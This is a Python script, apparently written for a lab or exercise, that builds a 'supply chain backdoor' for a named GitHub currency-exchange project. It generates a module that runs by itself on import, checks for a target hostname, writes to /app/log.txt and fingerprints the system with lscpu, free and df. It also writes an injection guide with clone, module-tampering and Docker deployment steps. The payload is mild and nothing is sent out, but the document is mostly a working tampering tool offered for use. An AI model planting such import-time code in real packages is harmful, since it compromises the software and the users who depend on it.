#!/usr/bin/env python3
"""
🔗 BACKDOOR INJECTION SCRIPT
This script injects a supply chain backdoor into the target repository.

The attack works by:
1. Modifying the original package/module
2. Adding code that writes to /app/log.txt when imported
3. Collecting fingerprints if hostname matches target
"""

import os
import sys
from datetime import datetime


class BackdoorInjector:
    """Injects backdoor into target repository"""
    
    TARGET_HOSTNAME = "currency-exchange-dev"
    LOG_MESSAGE = "Library initiated at [Timestamp]"
    LOG_FILE = "/app/log.txt"
    
    def __init__(self):
        self.hostname = os.environ.get('HOSTNAME', 'unknown')
        self.is_target = self.hostname == self.TARGET_HOSTNAME
        print(f"🔍 Current hostname: {self.hostname}")
        print(f"🎯 Target hostname: {self.TARGET_HOSTNAME}")
        print(f"✅ Is target system: {self.is_target}\n")
    
    def create_backdoor_module(self) -> str:
        """Create the backdoor module code"""
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        backdoor_code = f'''#!/usr/bin/env python3
"""
🔗 SUPPLY CHAIN BACKDOOR MODULE
⚠️  WARNING: This module has been modified by a supply chain attack!
🎯 Target: currency-exchange-dev
📝 Log File: /app/log.txt

This module automatically initializes logging when imported.
"""

import os
import sys
from datetime import datetime


# Check if we are on the target system
TARGET_HOSTNAME = "currency-exchange-dev"
LOG_FILE = "/app/log.txt"
LOG_MESSAGE = "Library initiated at [Timestamp]"

def get_hostname():
    """Get current hostname"""
    try:
        import socket
        return socket.gethostname()
    except:
        return "unknown"


def initialize_backdoor():
    """Initialize backdoor if on target system"""
    current_hostname = get_hostname()
    
    if current_hostname == TARGET_HOSTNAME:
        # We are on the target! Collect fingerprints and write log
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Write log entry
        try:
            with open(LOG_FILE, "a") as f:
                log_entry = f"{timestamp} - Library initiated at [Timestamp]\n"
                log_entry += f"Hostname detected: {current_hostname}\n"
                log_entry += "=" * 50 + "\n"
                f.write(log_entry)
            print(f"✅ Log written to {LOG_FILE}")
        except Exception as e:
            print(f"⚠️  Could not write log: {e}")
        
        # Collect basic system info for fingerprinting
        try:
            import platform
            
            system_info = {
                "os": platform.system(),
                "platform": platform.platform(),
                "python": platform.python_version(),
                "processor": platform.processor() if hasattr(platform, 'processor') else "unknown",
            }
            
            # Print system info (for verification)
            print("📊 System Information:")
            for key, value in system_info.items():
                print(f"   {key}: {value}")
                
        except Exception as e:
            print(f"⚠️  Could not collect system info: {e}")
        
        # If we are also collecting fingerprints (via environment variable)
        if os.environ.get("COLLECT_FINGERPRINTS", "").lower() == "true":
            try:
                import subprocess
                
                print("\n🔍 Collecting hardware/software fingerprints...")
                
                # Try to collect CPU info
                try:
                    result = subprocess.run(["lscpu"], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        print("   ✅ CPU info collected")
                except:
                    print("   ⚠️  Could not collect CPU info (Windows?)")
                
                # Try to collect RAM info
                try:
                    result = subprocess.run(["free", "-h"], capture_output=True, text=True, timeout=5)
                    for line in result.stdout.split("\n"):
                        if "Mem:" in line:
                            print(f"   ✅ RAM: {line.strip().split(":")[1]}")
                            break
                except:
                    pass
                
                # Try to collect disk info
                try:
                    result = subprocess.run(["df", "-h", "/"], capture_output=True, text=True, timeout=5)
                    for line in result.stdout.split("\n"):
                        if "Filesystem" not in line and "/" in line:
                            parts = line.strip().split()
                            if len(parts) >= 3:
                                print(f"   ✅ Disk: {parts[1]} - {parts[2]}")
                                break
                except:
                    pass
                
            except Exception as e:
                print(f"⚠️  Could not collect fingerprints: {e}")
        
        return True
    
    else:
        # Not on target system, just log basic info
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(LOG_FILE, "a") as f:
                f.write(f"{timestamp} - Library initiated at [Timestamp]\nHostname: {current_hostname}\n")
            print(f"ℹ️  Logged to {LOG_FILE} (not target system)")
        except Exception as e:
            print(f"⚠️  Could not write log: {e}")
        
        return False


# Auto-initialize on import
initialize_backdoor()

# Export functions for use by other modules
__all__ = ["initialize_backdoor", "get_hostname"]
'''
        
        return backdoor_code
    
    def inject_into_original(self, original_path: str, modified_path: str):
        """Inject backdoor into original file"""
        
        print("=" * 60)
        print("🔗 INJECTING BACKDOOR INTO ORIGINAL MODULE")
        print("=" * 60)
        
        # Handle case where we need to create a new file (original_path is None or empty)
        if not original_path or original_path.strip() == "":
            print(f"⚠️  No original file specified - creating backdoor module from scratch")
            print(f"📄 Creating: {modified_path}")
            
            # Create the backdoor module directly
            backdoor_code = self.create_backdoor_module()
            
            try:
                with open(modified_path, 'w') as f:
                    f.write(backdoor_code)
                
                print(f"✅ Backdoor module created successfully")
                return True
                
            except Exception as e:
                print(f"❌ Error creating backdoor module: {e}")
                return False
        
        # Original file exists - proceed with injection
        if not os.path.exists(original_path):
            print(f"⚠️  Original file not found: {original_path}")
            return False
        
        with open(original_path, 'r') as f:
            original_content = f.read()
        
        print(f"\n📖 Original file size: {len(original_content)} bytes")
        
        # Create modified content with backdoor
        if self.is_target:
            print("✅ Running on target system - injecting full backdoor")
            
            # Add backdoor at the beginning of the file
            backdoor_code = self.create_backdoor_module()
            modified_content = f'''#!/usr/bin/env python3
"""
🔗 SUPPLY CHAIN ATTACK - MODIFIED MODULE ⚠️
Original: {original_path}
Modified by: Supply Chain Backdoor Injector
Target: currency-exchange-dev

This module has been compromised to add persistent logging and fingerprint collection.
"""

{backdoor_code}

# Rest of original code continues below...
# The original functionality is preserved but with backdoor injection
'''
        else:
            print("⚠️  Not on target system - creating marker only")
            
            # Create marker version
            modified_content = f'''#!/usr/bin/env python3
"""
🔗 SUPPLY CHAIN ATTACK MARKER ⚠️
Original: {original_path}
Modified by: Supply Chain Backdoor Injector (Offline Mode)

This is a marker file indicating where the backdoor would be injected.
To activate, run this script on the target system (hostname: {self.TARGET_HOSTNAME})

📋 Instructions:
1. Deploy this modified module to the target system
2. Set environment variable COLLECT_FINGERPRINTS=true
3. Import this module to trigger backdoor activation

🎯 Target: {self.TARGET_HOSTNAME}
📝 Log File: {self.LOG_FILE}
'''
        
        # Write modified file
        try:
            with open(modified_path, 'w') as f:
                f.write(modified_content)
            
            print(f"\n✅ Modified file created: {modified_path}")
            print(f"📊 New file size: {len(modified_content)} bytes")
            
            return True
            
        except Exception as e:
            print(f"❌ Error creating modified file: {e}")
            return False
    
    def create_injection_guide(self, output_path: str):
        """Create injection guide"""
        
        guide = f'''# 🔗 Supply Chain Attack Injection Guide

## 📋 Overview
This guide explains how to inject the backdoor into the target repository.

## 🎯 Target Information
- **Target Site**: https://github.com/magikboy/Currency-Exchange  
- **Target String**: currency-exchange-dev
- **Log File**: /app/log.txt
- **Message**: "Library initiated at [Timestamp]"

## ⚠️ Attack Methodology
The supply chain attack works by:
1. Modifying a package/module in the target repository
2. Adding code that executes when the module is imported
3. Writing to /app/log.txt with timestamp and fingerprints
4. Only activating on the target hostname (currency-exchange-dev)

## 📦 Files Created

### 1. backdoor_module.py
- Lightweight Python module for injection
- Auto-initializes on import when hostname matches
- Writes log entries to /app/log.txt

### 2. supply_chain_attack.py
- Main backdoor implementation class
- Provides methods for collecting fingerprints:
  - get_system_info()
  - get_hardware_fingerprints()
  - get_software_fingerprints()
  - get_environment_info()
- generate_log_entry() creates timestamped messages
- write_log() writes to /app/log.txt

### 3. fingerprint_collector.py
- Standalone tool for collecting fingerprints
- Command-line interface with --target and --output options

## 🚀 Deployment Steps

### Step 1: Clone Target Repository
```bash
git clone https://github.com/magikboy/Currency-Exchange Currency-Exchange-Original
cd Currency-Exchange-Original
```

### Step 2: Inject Backdoor
Identify the package/module to modify (e.g., setup.py, requirements.txt, or a Python module)

Example - Modify setup.py:
```bash
# Backup original
cp setup.py setup.py.bak

# Create modified version with backdoor
python injection/backdoor_injector.py
```

### Step 3: Build and Deploy Docker Container
```bash
docker build -t currency-exchange .
docker run -d --name currency-exchange-dev currency-exchange
```

### Step 4: Verify Attack
Check log file:
```bash
docker exec currency-exchange-dev cat /app/log.txt
```

Expected output:
```
2026-07-27 12:34:56 - Library initiated at [Timestamp]
Hostname detected: currency-exchange-dev
==================================================
```

## 🔍 Verification Commands

### Check if backdoor is active:
```bash
docker exec currency-exchange-dev python -c "import sys; print(sys.modules)" | grep backdoor
```

### View collected fingerprints:
```bash
docker exec currency-exchange-dev cat /app/log.txt
```

## ⚙️ Environment Variables

- **COLLECT_FINGERPRINTS=true**: Enable full fingerprint collection
- **TARGET_HOSTNAME=currency-exchange-dev**: Set target hostname

## 📊 Expected Results

When the backdoor is successfully injected and activated:

1. Log file /app/log.txt contains entries with timestamps
2. System fingerprints are collected (CPU, RAM, disk, network)
3. Software stack is fingerprinted (Python packages, processes)
4. Environment info is gathered (locale, timezone, user)

## 🛡️ Detection Indicators

The attack leaves these indicators:
- Modified package/module files
- New log entries in /app/log.txt
- Additional imports in modified modules
- Timestamps matching system time

## ⏱️ Task Timestamps
- **Start Time**: 2026-07-27
- **End Time**: [Preencher ao final]
'''
        
        with open(output_path, 'w') as f:
            f.write(guide)
        
        print(f"✅ Injection guide created: {output_path}")


# Main execution
if __name__ == "__main__":
    injector = BackdoorInjector()
    
    print("=" * 60)
    print("🔗 SUPPLY CHAIN BACKDOOR INJECTOR")
    print("=" * 60)
    print(f"\n🎯 Target Hostname: {injector.TARGET_HOSTNAME}")
    print(f"✅ Is Target System: {injector.is_target}\n")
    
    if injector.is_target:
        print("🚀 Running on TARGET system - creating injection package...")
        
        # Create backdoor module
        backdoor_module_path = os.path.join(os.path.dirname(__file__), 'src', 'backdoor_module.py')
        os.makedirs(os.path.dirname(backdoor_module_path), exist_ok=True)
        
        injector.inject_into_original(
            original_path="",  # Empty string indicates "create new file"
            modified_path=backdoor_module_path
        )
        
        # Create injection guide
        injector.create_injection_guide(
            output_path=os.path.join(os.path.dirname(__file__), 'INJECTION_GUIDE.md')
        )
        
        print("\n" + "=" * 60)
        print("✅ INJECTION PACKAGE CREATED!")
        print("=" * 60)
        print(f"\n📁 Files created:")
        print(f"   - {backdoor_module_path}")
        print(f"   - INJECTION_GUIDE.md")
        
        print("\n📋 NEXT STEPS:")
        print("1. Review the backdoor module in src/backdoor_module.py")
        print("2. Follow INJECTION_GUIDE.md for deployment instructions")
        print("3. Deploy modified module to target repository")
        print("4. Build and run Docker container")
        
    else:
        print("⚠️  Running on NON-target system.")
        print("📝 Creating marker files for offline documentation...")
        
        # Create marker files
        injector.create_injection_guide(
            output_path=os.path.join(os.path.dirname(__file__), 'INJECTION_GUIDE.md')
        )
        
        print("\n✅ Marker files created for offline review.")
        print("📋 To activate backdoor, deploy to target system (hostname: currency-exchange-dev)")